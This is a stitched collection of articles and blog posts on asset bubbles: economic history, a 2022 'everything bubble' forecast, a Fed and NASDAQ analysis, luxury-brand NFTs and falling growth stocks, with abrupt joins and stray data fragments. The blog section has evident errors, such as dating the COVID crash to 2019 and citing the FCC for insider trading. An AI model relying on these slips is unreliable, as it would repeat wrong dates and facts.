Redistribution of Wealth This redistribution of wealth and income from late investors to the early recipients of newly created money and credit who got in on the ground floor is what makes the formation and collapse of asset price bubbles very much like a pyramid or Ponzi scheme.

When this process is driven by money in its modern form of a fiat currency mostly made of fractional reserve credit created by the central bank and the banking system, then the bursting of the bubble not only induces losses to the then current holders of the bubble assets, but it can also lead to a process of debt deflation that spread beyond those exposed directly to the bubble assets but to all other debtors as well. This means that any sufficiently large bubble can crash the entire economy into recession under the right monetary conditions.

Historical Examples of Asset Bubbles

The biggest asset bubbles in recent history have been followed by deep recessions. The reverse is equally true: the largest and most high-profile economic crises in the U.S. have been preceded by asset bubbles. While the correlation between asset bubbles and recessions is irrefutable, economists debate the strength of the cause-and-effect relationship.

Many argue that other economic factors may contribute to recessions, or that each recession is so unique that general causes can’t really be identified. Some economists even dispute the existence of bubbles at all, and argue that large real economic shocks randomly knock the economy into recession from time to time, independent of financial factors, that price bubbles and crashes are simply the optimal market response to changing real fundamentals. Broader agreement exists, however, that the bursting of an asset bubble has played at least some role in each of the following economic recessions.

The 1920s Stock Market Bubble/The Great Depression

The 1920s began with a deep but short recession that gave way to a prolonged period of economic expansion. Lavish wealth, the kind depicted in F. Scott Fitzgerald's ""The Great Gatsby,"" became an American mainstay during the Roaring Twenties. The bubble started when the Fed eased credit requirements and lowered interest rates in the second half of 1921 through 1922, hoping to spur borrowing, increase the money supply, and stimulate the economy. It worked, but too well. Consumers and businesses began taking on more debt than ever. By the middle of the decade, there was an additional $500 million in circulation compared to five years earlier. The Fed’s easy money policies extended through most of the 1920’s and stock prices soared as a result of the new money flowing into the economy through the banking system.

The Roaring 20's Steady expansion of the supply of money and credit through the 1920's fueled a massive bubble in stock prices. Widespread adoption of the telephone and the shift from a majority rural to a majority urban population increased the appeal of more sophisticated savings and investment strategies like stock ownership compared traditionally popular savings accounts and life insurance policies.

The excess of the 1920s was fun while it lasted but far from sustainable. By 1929, cracks began to appear in the facade. The problem was debt had fueled too much of the decade's extravagance. The investors, the general public, and the banks eventually became skeptical that the continuous extension of new credit could go on forever, and began to cut back to protect themselves from the eventual speculative losses. Savvy investors, the ones tuned in to the idea the good times were about to end, began profit-taking. They locked in their gains, anticipating a coming market decline.

Before too long, a massive sell-off took hold. People and businesses began withdrawing their money at such a rate that the banks didn't have the available capital to meet the requests. Debt deflation set in despite Fed attempts to reinflate. The rapidly worsening situation culminated with the crash of 1929, which witnessed the insolvency of several large banks due to bank runs.

The crash touched off The Great Depression, still known as the worst economic crisis in modern American history. While the official years of the Depression were from 1929 to 1939, the economy did not regain footing on a long-term basis until World War II ended in 1945.

The 1990s Dot-Com Bubble/Early 2000s Recession

In the year 1990, the words Internet, Web and online did not even exist in the common lexicon. By 1999, they dominated the economy. The Nasdaq index, which tracks mostly tech-based stocks, hovered just above 710 at in October 1990. By the turn of the century, it had soared past 6,700.

In 1995, the Fed began easing monetary policy in order to support the government bailout of the holders of Mexican bonds in response to the Mexican debt crisis. U.S. M2 money supply growth quickly accelerated from less that 1% per year to over 5% as the Fed began injecting new reserves into the banking system, peaking at over 8% by early 1999. The new liquid credit that the Fed added to the economy began to flow into the emerging tech sector. As the Fed dropped interest rates starting in 1995, the Nasdaq began to really take off, Netscape launched its IPO, and the dot-com bubble began.

Market Hype The hype of new technologies can attract the flow of new money investment that leads to a bubble.

The Internet changed the way the world lives and does business. Many robust companies launched during the dot-com bubble, such as Google, Yahoo, and Amazon. Dwarfing the number of these companies, however, was the number of fly-by-night companies with no long-term vision, no innovation and often no product at all. Because investors were swept up in dot-com mania, these companies still attracted millions of investment dollars, many even managing to go public without ever releasing a product to the market.

As wage and consumer price pressures mounted amid a flood of liquidity meant to combat the underwhelming effects of the Y2K bug, the Fed began cutting back money supply growth and raising interest rates in early 2000. This pulled the run out from under the Fed fueled mania of the tech boom.

A Nasdaq sell-off in March 2000 marked the end of the dot-com bubble. The recession that followed was relatively shallow for the broader economy but devastating for the tech industry. The Bay Area in California, home to tech-heavy Silicon Valley, saw unemployment rates reach their highest levels in decades, which were recently far surpassed by the impact of the COVID-19 pandemic.

The 2000s Real Estate Bubble/The Great Recession

Many factors coalesced to produce the 2000s real estate bubble. The biggest were monetary expansion leading to low interest rates and significantly relaxed lending standards. The Fed dropped its target interest rate to successive historic lows from 2000 to mid-2004 and the M2 money supply grew an average of 6.5% per year. Federal housing policies under the general heading of the “Ownership Society” championed by President Bush helped drive the newly created credit into the housing sector, and deregulation of the financial sector allowed the multiplication of exotic new home loan products and credit derivatives based on them.

Government Policies Government policies that try to shape economic trends are almost bound to guide the growth of bubbles in the presence of the expansion of money and credit.

As house fever spread like a drought-fueled conflagration, lenders, particularly those in the high-risk arena known as subprime, began competing with each other on who could relax standards the most and attract the riskiest buyers. One loan product that best embodies the level of insanity reached by subprime lenders in the mid-2000s is the NINJA loan; no income, no job, or asset verification were required for approval.

For much of the 2000s, getting a mortgage was easier than getting approved to rent an apartment. As a result, demand for real estate surged. Real estate agents, builders, bankers, and mortgage brokers frolicked in the excess, making piles of money as easily as the 1980s Masters of the Universe portrayed in Tom Wolfe's ""Bonfire of the Vanities.""

As one might expect, a bubble fueled in large part by the practice of loaning hundreds of thousands of dollars to people unable to prove they had assets or even jobs was unsustainable. In certain parts of the country, such as Florida and Las Vegas, home prices began to tumble as early as 2006. By 2008, the entire country was in full economic meltdown. Large banks, including the storied Lehman Brothers, became insolvent, a result of tying up too much money in securities backed by the aforementioned subprime mortgages. Housing prices tumbled by more than 50% in some areas. The resulting Great Recession would crash markets around the globe, put many millions out of work, and permanently reshaped the structure of the economy.",Asset Bubble Burst,2017-03-25 23:30:07

Maybe then when those bubbles burst, they will not be caught out as flatfooted as they were in 2008.

My years of working as an economist on Wall Street taught me that all too often the consensus economic view turns out to be very wrong. A striking instance of such an error was the spectacular failure of the economic profession to anticipate the 2008-2009 Great Economic Recession. A principal reason for that forecasting error was the failure of most economists to take into account financial market considerations.

Next year is shaping up to be another year when the consensus economic forecast will prove to be way off the mark for a similar reason. Whereas the consensus view now seems to be that inflation will be 2022’s main economic problem, it seems more probable that once central banks start tightening monetary policy to control inflation, the bursting of today’s global “everything” asset price and credit market bubble will be our principal economic headache. When those bubbles burst, inflation will be the least of our economic problems as was the case during the 2008-2009 economic recession.

If before the Omicron variant appeared on the scene inflation was not generally regarded as next year’s main economic challenge, it has now become so. In Congressional testimony this week, Federal Reserve Chair Jerome Powell, the erstwhile main proponent of the “inflation will be transitory” school of thought, is now counseling that transitory be removed from the inflation lexicon. In a similar vein, the Organization for Economic Cooperation and Development (OECD) is now warning that Omicron will keep the global supply chain disrupted and that in turn will keep inflation high.

Anyone doubting the pervasiveness of today’s global “everything” asset price and credit market bubble need only take a look at the financial stability reports put out by the Federal Reserve, the European Central Bank, and the International Monetary Fund.

Those reports reveal that global equity valuations are at extremely stretched levels while housing price bubbles characterize all too many economies including that of the United States. They also show that record amounts of money have been loaned at very low interest rates to highly risky borrowers in both the advanced and the emerging market economies. At the same time, exotic asset markets like those for the cryptocurrencies have gone through the stratosphere.

One reason to think that inflation will not be our main economic problem in 2022 is that the Fed is already giving signals that it will soon start shifting to a tighter monetary policy stance with a view to bringing inflation under control. In particular, Powell has now announced that at its next meeting the Fed will be discussing the case for accelerating its present pace of bond-buying tapering. That presumably would pave the way for interest rate hikes before the middle of the year.

Another factor that could cool inflation next year might be the Omicron variant. If this variant turns out to be very much more transmissible and vaccine-resistant than was the Delta variant, it could have the effect of stopping the global economic recovery in its tracks, thereby reducing inflationary pressures.

However, the primary reason to think that inflation will not be our main economic problem next year is today’s global everything bubble. That bubble, which is very much more pervasive than was the 2006 U.S. housing and credit market bubble, has been premised on the assumption that low interest rates will last forever, and that world economic growth will continue indefinitely at a satisfactory clip. If the Fed does start hiking interest rates or if the Omicron variant proves to be a major headwind to world economic growth, there is every prospect that those premises would have been belied and today’s global everything bubble would burst.

To be sure, today’s U.S. and world banking systems are in a very much better position to cope with bursting asset prices and credit market bubbles than they were in 2008. However, the world today is very much more indebted than it was in 2008 and the all-important and unregulated non-bank sector of the economy is over-leveraged. This makes it all too likely that if today’s everything bubble was indeed to burst, both the United States and the world economies will have a hard landing.

In planning for the year ahead, economic policymakers should pay less attention to the consensus economic forecast and more attention to today’s everything asset and credit market bubble. Maybe then when those bubbles burst, they will not be caught out as flatfooted as they were in 2008.

I focus on the inflation macro event in this blog article, A financial market bubble? Photo by Raspopova Marina on Unsplash Disclaimer: the following content is for informational purposes only and does not constitute financial advice. Do not take any decisions based solely on my writing. The Wisdom and Madness of the Crowd The Wisdom of Crowds (WoC) is the theory that a large number of investors or a large number of decisions are collectively better than individual experts when predicting the future value of the market, sector, or financial instruments. An investor's decision or group includes a decision error of some unknown amount, and the decision must be negligibly independent of the other decisions. The average of the decisions is the WoC. The WoC errors cancel each other out so that the average decision error is zero in the long term using the efficient market theory. We are left with the average of the decisions being an accurate prediction of the future. For me, WoC is a corollary of the Efficient Market Theory (EMT). The value of the Financial Market has been increasing for over three hundred years. EMT is the basis of the reasoning behind market indices. The Madness of Crowds (MoC) is the theory that a large number of investors or a large number of decisions are collectively worse than individual experts when predicting the future value of the market, sector, or financial instruments. The decision of an investor or a group of investors includes a decision error of some unknown amount that increasingly grows risk. In the case of MoC, the decisions are highly correlated. A famous example of MoC was Black Tuesday, Oct. 29, 1929. There is even an indicator called the shoeshine boy indicator. The story took place in 1929 : Joseph Patrick “Joe” Kennedy, Sr. JFK’s father, claimed that he knew it was time to get out of the stock market when he got investment tips from a shoeshine boy. On that moment Joe Kennedy had the intuition that we were at the end of the bull market and subsequently he decided to short the market. Ever since, the shoeshine boy has been the metaphor for “time to get out”; for the end of the mania phase in which everyone, even the shoeshine boy, wants in. — 4investors.com Note: There are other stories about ""Joe"" Kennedy, Sr.'s source of wealth, but why dilute this ""indicator."" For me, MoC is a corollary of the Chaotic Market Theory (CMT). My viewpoint and the viewpoint throughout this blog article is WoC rules that market over the long term (years). The market is chaotic over the short term (days, weeks, quarters). MoC rules the market in the long term.

What is a Financial Market Surprise? A Financial Market Surprise is a macro event affecting the Financial Market, or a micro event, affecting a financial market sector or company, which is a change that is not yet priced into the market. Throughout this blog article, surprises or predicted events that cause an upturn in prices is called tailwinds. Surprises or predicted events that cause downturns in prices are headwinds. Notice I have widened the definition of a Financial Market Surprise to include predicted effects that occur. Usually, unexpected events result in big Financial Market Surprises, and predicted events are priced and thus result in minor or negligible Financial Market Surprises. COVID-19 was a big Financial Market Surprise.

What is a Bubble Burst? I do not know precisely the properties of a Bubble Burst. From my viewpoint, bubble bursts are arbitrarily defined. One working definition has Bubble Bursts characterized by a threshold length of time and a threshold amount of price downturn. Over the last four years, I read that we are in the longest existing rally, and these years were predicted to burst ""the financial market bubble"": 2018, 2019, 2020, and 2021. There are already articles predicting a market bubble burst in 2022. I am confident that someone will predict a bubble burst some year. Meanwhile, I watch indicators, and I watch for financial market surprises. As I often say: if you know about some event for more than one day, then the market (Wisdom of Crowd) has already efficiently priced the market price. Only unexpected events cause an upturn (tailwind) or downturn (headwind) in market price. What are these FMS events? These events are rarely predicted. That is what makes them FMS events. Knowing beforehand of a result of an FMS event is usually a sign of psychic ability or insider trading. The FCC, in most cases, ignores the difference. Financial Market Surprises are diagnosed after they occur and make great material for books. A recent example is the ""Great Repression."" I use indicators not to predict but to measure the financial market's stability or unstable. By my theory, the more unstable the market, a smaller FMS causes a market downturn or upturn. Correspondingly, a larger FMS causes the downturn or upturn of a stable market. A big enough FMS transforms a stable market into an unstable market. A horrible example of a gigantic Financial Market Surprise —global nuclear war.

Significant Downturns in the 21st Century The 2000s downturn was a decline in economic activity in the European Union during 2000 and 2001, the United States from March to November 2001 and continued 1990s Japan's recession. Some economists in the United States object to characterizing it as a recession since there were no two consecutive quarters of negative growth. The S&P 500 fell 57% from its peak in late 2007. This downturn in market instruments and housing prices is commonly referred to as the 2007–2008 housing price bubble burst. Some would argue that the upturn in prices of market instruments (rally) from the 2007–2008 ""Great Recession"" started in late 2008 and continues up to the date of this blog article's publishing date. Whenever the 2007–2008 bubble burst started and whatever the explanation of causes, there were market corrections, price downturns, and upturns, but none were referred to as bubble bursts. The stock market asset value fell 34% and recovered in the short two-month period of mid-February to mid-April-2019. Most analysts state the downward adjustment was caused by the COVID-19 epidemic's impact on the world economy. The period is not generally considered a recession or bubble burst. I call the 2019 market downturn a brief downturn, while others call it a crash. I may be prejudiced, as I was surprised by the small size of the 2019 downturn and the brief amount of time the downturn lasted.

Watching Market Indictors I can not predict when the market will experience a downturn or upturn. An immense downturn, such as a bubble burst, is a Financial Market Surprise and is outside the purview of the WoC. However, I consider watching the market indicators and, more importantly, predicting value beneficial in choosing your long-term holdings. There are many indicators of a financial market. There are also many headwinds — decreasing and tailwinds — increasing the Financial Market's value (macro factors), sectors, and individual instruments (micro factors). Note: I look at a limited number of technology sectors and do not comment on the possible effect on the broader market sectors.

Indicators that Lag the Financial Market The GNP (Gross Domestic Product) indicator has negligible or no predictive capability of the Financial Market. There is no FMS in the GNP as it is a historical measure of the Financial Market. GNP The typical way to gauge economic progress is by measuring the gross domestic product (GDP). It was formulated in the 1930s to measure the health of the USA as it recovered from the Great Depression. GNP is a measure of the past health of the country. A chief architect of the GNP measure, Simon Kuznets, ""tried to drive home"" that GNP should not be used to predict the country's future health. However, most of us have used GNP to predict the economy's future health and technological progress. Productivity is the Driving the Financial Market Value Upward for the Last 200 Years I define productivity as assets output divided by human labor input. The assets are tangible and intangible items that have an assigned value. Based on the last hundred years, given the constant trend of increasing productivity, some market downtrends are corrections for built-up upward market error. Some market uptrends are market corrections for built-up downward market error. Somewhere between market downtrends and uptrends is the average financial market value. Productivity and Innovation In my humble opinion (IMHO), innovation and invention have been increasing productivity which has driven the Financial Market value upward for over 200 Years. The internet erupted with Web 1.0 in about 1999. The following five years were chaotic and stagnant growth for the Web. A growing assortment of digital products and services in 2005 caused growth again in the Web. Widespread use of the Web caused businesses to have ""a must have presense"" to stay competitive. A trickle in 2005 had turned into an exponentially increasing number of new digital technologies coming from Goggle, Facebook, Apple, GitHub, Microsoft, and many others. Furthermore, in the last decade, ""free stuff"" has dominated technologies such as software, Web 2.0, and machine learning. However, GDP does not account for the economic benefits of free digital products and services in the last fifteen years. I will not use GNP, and I will only use data from 2005 to now to understand the behavior of the current Financial Market.

The Fed Has Two Methods for the Reactive Steering Of The US Economy The Federal Reserve Board (Fed), also called the Central Bank of the United States, oversees all US domestic monetary policy. I am noting not criticizing the fact that the Fed REACTS to the state of the US economy. The Fed has two methods for steering the US economy. The Fed increases or decreases the amount of money in the economy. The Fed can print more money. Also, the Fed can increase the money supply by lowering the reserve requirements for banks, which allows them to lend more money. Contrarily, by raising the banks' reserve requirements, the Fed can decrease the size of the money supply. The Fed alters short-term interest rates by lowering (or raising) the discount rate that banks pay on short-term loans from the Fed.

CPI — Consumer Price Index — Inflation Index Indicator The annual inflation rate, measured by the Consumer Price Index (CPI), increased in the US to 7% in December of 2021. Figure 1. Inflation as measured by CPI (%) by month for the calendar year 2021. Source: Data from US Bureau of Labor Statistics. Creating currency to slow down inflation is analogous to pouring gasoline on a fire to stop the fire. The Fed is proposing to use its other primary method. The Fed is predicting a stepped sequence of raises to the discount rate. The table below shows the average and standard deviation of the Fed director's September and December predicted discount rates for 2022 and 2023. Table 1. Source: Data from Federal Reserve Press Releases, Table by author. If we consider standard deviation (STD) as the diversity of opinion among the 17 governors and one chairman, then the projected Fed discount loan rate for 2022 and 2023 increased, and its diversity increased as inflation increased from 4.5% in September 2022 to 7% in December 2022. Past Fed Rate Hikes The Fed raised the discount interest rate, often called a rate hike, to reduce the inflation in the period starting in April 2005 and starting in January 2017. From 2005 to now, the Fed has raised the discount interest rate twice. In both periods, the US Financial Market downturned 15% or more. The predominant reasoning for the market downturn is that debt becomes more expensive. There are probably more factors that caused the Financial Market downturn. Figure 2: Covers Period from Jan-2005 to Dec-2021. The green-tinted boxes cover rising Fed rate and inflation periods, as measured by CPI, above 3%. The red-tinted boxes cover periods of declining or flat Fed rate and inflation, as measured by CPI, above 3%. Source: graph by author, data from Federal Reserve and US Bureau of Labor Statistics and Yahoo.com. Note: The behavior of CPI, Fed discount rate, and NASDAQ index are shown in Figure 2. Little or no diagnosis of the behavior of CPI, Fed discount rate, and NASDAQ index is advanced. Above, in Figure 2, I numbered major trends of the CPI (inflation), the Fed Rate, and the NASDAQ index. The blue numbered squares, 1–5, pinpoint when CPI rises near or above 3%.

The red numbered squares, 1–7, pinpoint the NASDAQ market index's bottom or near bottom downturn.

The gray numbered squares, 1–5, pinpoint when the Fed discount is flat for two quarters, six months, or more. The Fed rate has been raised twice since 2005. Both times the NASDAQ fell. Past Fed Rate Setting Policy Fed policy has varied from 2005 to the present, as the chairman, governors, and economic sentiment varied. Figure 3: Covers Period from Jan-2005 to Dec-2021. The number following the label dash corresponds to the type of Fed rate action. FedRateRaise is counted three times due to predicted rate hikes in 2022 and 2023. Source: graph by author, data from Federal Reserve and US Bureau of Labor Statistics. I attempt to simplify the complex and changing Fed rate change actions shown in Figure 3. The Fed rate is raised if the CPI has risen above 3% for at least two quarters AND the Financial market is NOT declining. The exception is that CPI has been above 3% since April 2021, and the Fed has not raised rates yet. However, the Fed body of 18 governors is predicting they WILL raise the Fed discount rate. The average predicted Fed rate for 2022 and 2023, as shown in Table 1, rose from the meeting in September 2021 and rose significantly more in the meeting in December 2021. Inflation is still rising in January 2022. Shortages caused by several problems in the supply chain, historically high inflation, corporate earnings, the pandemic COVID-19 variants, and a tangle of rising geopolitical are causing larger, not smaller Financial Market headwinds. 2. The Fed rate is lowered or held low, even if the CPI has risen above 3% if the Financial market is declining or not low. Remember the seeming exception to policy #1, above, where the Fed rate has not been raised even though the CPI has been above 3% since April 2021? The NASDAQ started down, turning in late December 2021. But Fed's rate predictions have gone up since September 2021 meeting. Has the Fed rate-setting policy changed? Current Fed rate change actions (none) indicate policy has not changed. Current Fed predictions for 2022 and 2023 and if the Financial Market continues to decline, then the Fed historical behavior has changed. Is the Fed rate being raised a third time since 2005, coinciding with a further decline in the NASDAQ?

Summary of Technology and Fed Discount Rate, CPI, and NASDAQ Index from January 2005 To December 2021 I graphed the change in the NASDAQ index because it is dominated by the price of [digital, internet, machine-learning, biotech] technology companies. We see the dominance of the technology sector in the NASDAQ index by comparing it to the NASDAQ top 100 technology companies index, NDXT, in Figure 4. Figure 4. The NASDAQ index and ˆNDTX track closely. Source: graph by author, data from Yahoo.com. The current ""personal-tech"" era has emerged as the next major era after the industrial era (revolution), IMHO. This is the reason, as I mentioned earlier, I focus on the technology sector in this article and near-term future blog articles. Figure 5. The orange line is the monthly ˆNDTX price. The dashed blue line is a fitted exponential function to the monthly ˆNDTX price Source: graph by author, data from Yahoo.com. The price of the top value technology companies that make up the NDTX index has upturned exponentially from 2005 to now. “My models show that we are doubling the paradigm-shift rate every decade.” — Ray Kurzweil

So, it’s not simply “goodbye luxury NFTs” in general.
He consults many of the leading luxury brands in the world, is the author of several best-selling luxury management books, a global keynote speaker, and holds luxury masterclasses on the future of luxury, disruption, and the luxury metaverse in Europe, the USA, and Asia.","Luxury is, in short, extreme value creation. The best luxury brands are incredibly good in creating value that is far beyond the typical category value. A great example is the Hermès Birkin bag, the world’s most expensive handbag, which starts around $10,000 and can exceed several hundred thousand dollars for exceptional pieces. Contrast this with the typical price range of luxury handbags between $500 and 2,000. The non-linearity of the price of a Birkin reflects the disproportionate value perceived by its clients and fans.

The value creation is such that the average value increase of used Birkins has exceeded the value increase of most investment vehicles over the span of the last 20 years. When you walk out of a Hermès store with a new Birkin bag, you can likely sell it immediately for a 20-30 percent premium. Year over year, the value has been increasing: this is extreme value creation par excellence.

Therefore, luxury brands need to be obsessed with continuously strengthening brand equity, storytelling, customer experience, and as a result, the value proposition of the brand. Every move should be strategic — the biggest asset is the trust of the clients. Brands that overly promote lose their ability to influence, and those who engage in incongruent moves risk a massive loss of consumer trust and desirability. As a result, being extremely strategic and intentional is critical to successfully create extreme value over time.

Interestingly, when it comes to activities in the metaverse, many brands forget strategy and see Web3 as a huge field for experimentation, often lacking strategy and intent. The number of luxury brand NFT drops is growing every day to a point where it is almost impossible to follow who does what and why. Being well-connected to some of the most influential NFT creators and trading platforms, I hear one complaint again and again: brands often approach them with a simple brief. “My CEO told me that I need to launch an NFT, because our competitors have. Can you develop something quick?” The result of these increasingly tactical moves will be disastrous for many brands. I estimate that already today 75-85 percent of all NFT projects are failures even if companies celebrate them as short-term successes internally and externally. The percentage will increase dramatically in the near future.

Recommended Reading By Daniel Langer Why Luxury Brands Must Be Strategic With NFTs in the Metaverse By Daniel Langer

Don’t get me wrong. NFTs are incredibly interesting and offer promising opportunities for brands, investors, and consumers. The metaverse is still in its infancy, after all. Estimates indicate that in 2021 the value of NFTs already accounted for 15-20 percent of the total market for art, or about $35-40 billion. The artist known as Beeple sold an NFT for $69 million, a record for a digital asset and the third highest ever paid for an artwork of a living artist.

Given that NFTs are just shy of eight years old and only became significant over the last 18-24 months, it’s safe to say that it is the fastest expanding category ever, even surpassing the adoption of crypto. Until now, the latter eclipsed anything before in terms of adoption rate, despite the high volatility and the recent value contraction of bitcoin and others.

I just presented about the opportunity for digital assets in the luxury space at one of the most important conferences about crypto as an exponential investment opportunity. The audience — managers of some of the most influential and powerful family offices in the world — shared my upbeat general outlook. However, there is a caveat.

Currently, there seems to be more demand than supply. This often results in prices that are disconnected with the intrinsic value of the asset fueled by the NFT pricing mechanism that most clients don’t understand fully in its entire psychology, further driving up the willingness-to-pay. With a growing number of digitable tokens, there are already signs of rapid commoditization. It’s simply not enough to have a seemingly random branded image of something and hope that customers will always apply value to it. At some point, there will be a significant market correction, a bubble burst, and what I call “soulless NFTs” will collapse in value. This is a major risk for the trust luxury brands need to build with their clients as they continuously increase prices. Many brands are playing with fire.

If an NFT is not treated as a strategic initiative and if brands don’t scrutinize their metaverse activities towards their ability to create extreme value for clients, then a disastrous outcome is almost certain. Not being radically intentional is the worst pitfall a brand can tap into in Web3’s reality. Obsession about digital extreme value creation is the only way for brands to stand out. There is no space for tactical experimentation without a clear objective. The stakes are too high.

So, what should luxury brands do? The most promising projects in the luxury space manage to transcend something physical of extreme value which is also closely connected to their brand story into the digital world. Those can be digital twins or collectables that are closely connected to a rare physical or experiential asset. This transcendence amplifies its real-life utility within the digital world. Instead of being prone to instability due to the lack of any underlying tangible asset or any uniquely intriguing story — as so many of the current NFT projects do — digital twins or asset-based NFTs can address the growing pain point of investors and clients who ask themselves, “where is the true value of an NFT?”

A recent luxury brand initiative that takes NFTs to a fascinating asset-backed level comes from Dictador Rum, one of the rarest, most luxurious, and sought-after spirits brands in the world. It has just launched Dictador’s ArtHouse Spirits DAO (DAO is the abbreviation for a “decentralized autonomous organization,” the latest form of digitally powered self-organized brand communities). Members of the DAO acquire a fractional ownership of the world’s rarest and most valuable trove of luxury rums, some of them decades old, through the purchase of an NFT as a “membership token.”

Depending on the membership status, which can be in excess of 1 million dollars, NFT owners have a vote on what to do with the treasury of physical assets, which will only get rarer and more exclusive with every passing year. Additionally, each NFT of the DAO is itself a unique piece of art, individualized and personalized, representing the map of the city of the owner. The DAO offers exclusive access to a high-net worth like-minded community of experts, investors, and collectors all over the world, further boosting the value proposition. The combination of art, treasury, and community differentiate this DAO from most other metaverse projects in the luxury space. Given the importance of a strong linkage to brand values, Dictador’s long-standing relationships with some of the most renowned artists and a history of one-of-a-kind digital artist created NTF’s backed up with rare and unique rum bottles for $100,000 or more, add to the desirability of the project.

This example shows luxury brands how to avoid the worst pitfalls in the metaverse. Houses must be true to their DNA and should see NFTs not as “nice to have” because it’s a trend. FOMO should not drive tactical decisions. Instead, NFTs offer the opportunity to dramatically increase the value proposition for their clients through the transcendence between digital, physical, community, and experiential assets. Projects should either be intentional or not done at all. So, it’s not simply “goodbye luxury NFTs” in general. Instead, luxury should say bye bye for good to any metaverse project that doesn’t create value. Otherwise it will be too late.

The Bubble Has Burst

In early July 2021, I released an article arguing that Technology/Growth stocks are in a market bubble and are due to drop substantially over the upcoming months due to rising inflation and lower, post-pandemic growth rates. Fast forward, many growth stocks have shed over 50% in recent months and some dropped even more dramatically. However, my point of this article is no way to brag or praise myself for being correct, since, in fact, I have been wrong about my thesis. While many growth stocks have fallen sharply, large-cap Tech stocks and the indexes held up well and continued to rise. Here, the S&P 500 (SPY) is down only 1% since then, and large-cap stocks such as Apple (AAPL) Google (GOOGL) (GOOGL) are up by more than 10%. However, this exactly could be a worrying sign for the markets in 2022.

Data by YCharts

Just under a year ago, in the midst of the second Covid-19 wave, technology and growth stocks continued to stay in high demand, as economies remained shut, translating to low inflation. Continuous monetary easing and high demand for technology solutions created a favorable environment for record valuations and new IPOs. It almost seemed like the rally in growth stocks would never end and that the sky was the limit for technology stocks. Fast forward, many of the most popular growth stocks including Zoom (ZM), Peloton (PTON), Fastly (FSLY), and Roku (ROKU) are down by more than 50%, erasing nearly all gains from the pandemic. At the time, it seemed nearly impossible that a high-quality large-cap company like Zoom could drop 70% in just one year, despite ever-growing revenues and profits.

Looking back, it is always simple to say that the drop was overdue, considering the stock was trading at over 120x Price to Sales at the time, or Fastly (FSLY) and DocuSign (DOCU), which were trading at 40x Price to Sales, despite not having turned a profit yet.

Stages of a Bubble (Trading View)

This exactly is the issue for most growth stocks; the narrative always revolves around growth, as opposed to profitability. However, when the prior story ends, they are revalued based on the future earnings power, which most of the time is not present, or not nearly as great as once anticipated. Take ad-tech firm 2U (TWOU) for instance, which once claimed a market capitalization of over $5 billion with constant annual growth rates of 40%. Revenues continued to climb as promised, reaching nearly $1 billion in 2021. The company also holds healthy gross margins of 85%, so surely it should be valued a lot higher today. In reality, 2U has a market capitalization of just around $700 million today, as it shows no clear path towards sustainable profitability.

The same happened to Wix.com (WIX) which has lost 75% in 2021, despite growing revenues by 29% and being free cash flow positive. Its profitability is exactly the issue: Wix estimates free cash flow of around $100 million in 2022, which means it would be trading at 200x FCF estimates at the time it was claiming at a $20 billion market cap in early 2021. Once growth slows and reality sets in, investors realize that they are not getting the promised return of their invested money and would rather go with a 'boring' cyclical, trading at 10 times free cash flow, thus offering a 10% yield. Of course, this doesn't mean it is the case for every growth story out there, as examples like Amazon, Apple, and Microsoft (MSFT) have proven in recent decades. The issue is that it is exactly the case for around 80% of 'story' stocks out there. Very few will become what has been promised from the start.

Now, for the stocks mentioned in the chart above, the opinions in financial markets could not be further apart. On one hand, many investors, including ARK Invest's CEO Cathie Wood believe that innovation-themed stocks have fallen way too much and are now trading at attractive levels.

Our biggest concern is that our investors turn what we believe are temporary losses into permanent losses"" - Cathie Wood

In this regard, Cathie Wood believes that her technology stocks are way undervalued, relative to their potential and sees 40% annual returns for her main ARK Innovation ETF (ARKK). This is due to the belief that the market capitalization for innovation stocks will rise from just $10 trillion to over $210 trillion over the next decades and makeup nearly all gains in the capital markets. In theory, this could be very likely, if it wasn't for competition, which is what financial markets are built upon. Sure, artificial intelligence, genomics, robotics, and data analytics are the future and will generate a large part of the global economic output by 2050, but naturally, profits attract competition and new innovation.

This means that companies included in innovation ETFs are already being disrupted by smaller start-ups, which aren't public yet. For example, DocuSign has been (and still is) considered to be the leader in electronic signatures, but over time new competitors are slowly beginning to emerge and take market share from DocuSign. For example, German-based startup Personio offers HR automation software, which also includes e-signatures. If companies see the same or greater value in their offering, they will simply switch, unless DocuSign lowers its price, leading to lower margins.

The point is, innovation is not a new concept and has been evolving over the last century. So the question is why aren't innovation stocks already making up 50% of capital market capitalizations today?

Is the Crash Over?

However, the most important question to investors is what will happen to stocks (both growth and value) in the future. In reality, no one knows the exact answer; however, there are various indicators that point to more blood in the markets.

Data by YCharts

First of all, many growth stocks are still trading at high subjective valuations, as demonstrated in the chart above. As inflation is reaching new records with new rate hikes expected throughout 2022, valuations of above 20x Price to Sales, appear unsustainable over the long term. Yes, many of these companies have demonstrated great earnings, but that doesn't mean that the given valuations can't substantially deflate, as demonstrated in the first chart of the article. Nevertheless, while many growth stocks substantially dropped in recent months, popular large-cap stocks fared fairly well in comparison. Apple and Microsoft (NASDAQ:MSFT) are down just a few percent, while Meta (FB), Netflix (NFLX) have been getting crushed after releasing their fourth-quarter earnings. Tesla (TSLA) is also down substantially, although the stock has seen quite a run-up before and is still up 20% year-over-year.

Data by YCharts

Overall, the S&P 500 index is down about 10% from all-time highs. From a technical standpoint speaking, the average investor will net a 15% return over the next 12 months, based on the last 33 times when the index crashed by 10% or more. However, it is not always safe to purely rely on history, considering the Nasdaq Index crashed over 75% in 2000 and the S&P 500 over 45%. British Investor, Jeremey Grantham who claims to have predicted the Japanese asset price bubble in 1989 as well as the dotcom bust of 2000 and the global financial crisis of 2008 is now warning of a similarly spectacular crash that could see the S&P 500 crash by another 43% to a level of 2500.

When it comes to the stock market, rather like 2000 and the tech bubble, this is more an American affair than anything else - Jeremey Grantham

However, Grantham also noted that stocks are particularly overpriced in the U.S, whereas Japan and the UK offer more value. Moreover, he believes that bargains can be found in emerging markets, which have been mostly neglected during the Covid-19 market rally. The investor has previously criticized the Federal Reserve for creating and destroying market bubbles, which mostly hurt, average-income retail investors.

One of the main reasons I deplore super-bubbles – and resent the Fed and other financial authorities for allowing and facilitating them – is the underrecognized damage that bubbles cause as they deflate and markdown our wealth. -Jeremey Grantham

U.S Inflation Rate (Trading Economics)

